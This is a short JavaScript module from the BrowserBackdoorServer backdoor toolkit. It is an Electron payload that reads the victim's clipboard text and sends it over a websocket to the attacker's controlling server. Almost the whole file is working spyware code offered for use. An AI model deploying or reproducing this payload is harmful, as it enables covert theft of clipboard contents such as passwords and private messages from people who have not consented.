/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Gets current clipboard text.
 * Parameters: None
 * Returns: Text in clipboard
 * Author: IMcPwn
 */

electron = require('electron');

ws.send(electron.clipboard.readText());
